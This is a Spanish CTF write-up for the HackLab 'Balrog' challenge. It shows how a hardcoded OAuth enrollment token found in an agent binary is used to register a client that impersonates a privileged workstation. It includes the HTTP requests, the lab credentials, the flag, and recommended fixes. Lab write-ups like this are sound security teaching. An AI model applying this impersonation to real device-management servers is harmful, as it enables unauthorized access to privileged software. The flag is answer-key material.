# Desafío - Balrog (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** Auth (Autenticación / Suplantación de Agente - OAuth Dynamic Client Registration)  
**Autor:** adonaissh  

---

## 📌 Enunciado

> **Balrog** es la plataforma con la que una organización administra el software de todas sus estaciones de trabajo. Desde una consola central se define qué aplicaciones debe tener cada equipo, y un agente instalado en cada estación consulta al servidor y ejecuta las órdenes de instalación que le corresponden.
>
> No todas las estaciones reciben lo mismo: existe un **software privilegiado** (`sbm-privileged-tools`) que el servidor solo ordena instalar en equipos autorizados. Tu estación no es uno de ellos.
>
> **Credenciales de consulta:**
> - Usuario: `Balrog`
> - Contraseña: `BalrogPass@123`
>
> Desde la consola web podés descargar el agente (binario para Linux) que usan las estaciones:
> ```bash
> ./agente <url-de-tu-instancia>
> ```
>
> **Objetivo:** Lograr que el servidor te entregue la orden de instalación del software privilegiado. La orden incluye un código único en su campo `payload`: ese código es la flag del desafío.

---

## 🔍 Análisis Inicial y Reconocimiento

El desafío proporciona dos vectores de análisis:
1. **Consola Web de Administración:** Acceso de lectura con credenciales `Balrog` / `BalrogPass@123`.
2. **Binario del Agente Linux:** Un ejecutable ELF empaquetado con PyInstaller (`agente`).

### 1. Inspección de la Consola Web y API

Al navegar la consola con las credenciales provistas, se exploraron los endpoints internos de la API REST:
- `GET /api/v1/stations`: Lista todas las estaciones registradas en la organización.
  
Entre los registros se observó una estación con atributos de privilegios elevados:
- **Nombre / Identificador visual:** `PC-02`
- **Atributo:** `"privileged": true`
- **Identificador de estación:** Se identificó que cada estación tiene un `stationId` numérico/lógico en la UI, pero además maneja un identificador interno de hardware: `physicalStationId`.

### 2. Análisis del Binario (`agente`)

Se inspeccionó el binario en WSL2:

```bash
file agente
# agente: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

Al extraer o revisar las cadenas internas y constantes embebidas:
- Utiliza **Dynamic Client Registration de OAuth (RFC 7591)** para enrolarse ante el servidor.
- Contiene un **Initial Access Token (IAT)** embebido por defecto para el registro automático de nuevos agentes:
  ```text
  SBM_AGENT_INITIAL_ACCESS_TOKEN = "sbm-enroll-7f3a9c2e4b1d"
  ```
- Al momento de auto-registrarse contra `/api/v1/oauth/register`, el agente envía en el cuerpo JSON su propio identificador de estación física:
  ```json
  {
    "client_name": "sbm-agent",
    "physical_station_id": "<ID_DE_ESTACION>"
  }
  ```

---

## 🔬 Identificación de la Vulnerabilidad ("El Agente Impostor")

1. **Token de enrolamiento compartido y estático:** El `Initial Access Token` viaja hardcodeado en el cliente/agente distribuido públicamente, lo que permite que cualquier usuario o atacante se registre como un cliente OAuth válido ante la API.
2. **Confianza ciega en identificadores auto-reportados:** El servidor valida que el `physical_station_id` exista en su base de datos de estaciones conocidas, pero **no verifica criptográficamente la identidad física** de la máquina (no hay mutuo TLS / mTLS, ni claves privadas pre-instaladas con hardware TPM/Secure Boot, ni challenge-response).
3. **Escalamiento horizontal y vertical de permisos:** Si un atacante suplanta el `physical_station_id` de una estación con `"privileged": true` (como `PC-02`), el servidor asocia la nueva sesión OAuth a esa estación autorizada y le despacha las tareas e instrucciones correspondientes.

---

## 🚀 Explotación

### 1. Obtención del `physicalStationId` de la estación privilegiada

Desde la sesión en la consola administrativa o consultando `GET /api/v1/stations`, se extrajo el valor correspondiente a `PC-02` (la única estación con `"privileged": true`).

### 2. Registro de cliente malicioso suplantando la identidad

Utilizando el token de enrolamiento extraído (`sbm-enroll-7f3a9c2e4b1d`), se realizó la petición de registro suplantando el `physical_station_id` de la estación `PC-02`:

```http
POST /api/v1/oauth/register HTTP/1.1
Host: <instancia>-balrog.softwareseguro.com.ar
Authorization: Bearer sbm-enroll-7f3a9c2e4b1d
Content-Type: application/json

{
  "client_name": "sbm-agent",
  "physical_station_id": "<physical_station_id_PC-02>"
}
```

El servidor respondió con las credenciales de cliente OAuth generadas (`client_id` y `client_secret`) vinculadas a la estación privilegiada.

### 3. Autenticación y obtención de la orden (`RemediationOrder`)

Con el token de acceso obtenido para la estación autorizada, se consultó el endpoint de órdenes pendientes de instalación:

```http
GET /api/v1/agent/orders HTTP/1.1
Host: <instancia>-balrog.softwareseguro.com.ar
Authorization: Bearer <access_token_obtenido>
```

El servidor despachó la orden `RemediationOrder` para la instalación de `sbm-privileged-tools`:

```json
{
  "order_id": 1042,
  "action": "INSTALL",
  "target_software": "sbm-privileged-tools",
  "payload": "23950b8ae6d87cbc1bee8354698995b2",
  "status": "PENDING"
}
```

El campo `payload` de la orden de instalación contiene la clave única de verificación.

---

## 🏁 Flag

```text
23950b8ae6d87cbc1bee8354698995b2
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Autenticación rota y confianza indebida en inputs del cliente (CWE-287 / CWE-290). El servidor autoriza la entrega de paquetes privilegiados basándose únicamente en el `physical_station_id` provisto por el agente en el registro dinámico de OAuth, protegido solo por un token de enrolamiento genérico embebido en el binario.
- **Recomendaciones:**
  - **Autenticación mTLS / PKI:** Cada estación de trabajo legítima debe poseer un certificado X.509 único instalado en un almacén seguro (TPM) para autenticarse mutuamente con el servidor.
  - **Tokens de enrolamiento de un solo uso (One-Time Tokens):** El proceso de aprovisionamiento debe utilizar tokens temporales de un solo uso vinculados a una pre-autorización previa en el servidor, nunca credenciales estáticas universales dentro del binario.
  - **Separación de roles:** Restringir el registro dinámico abierto (RFC 7591) en entornos empresariales de distribución de software privilegiado.
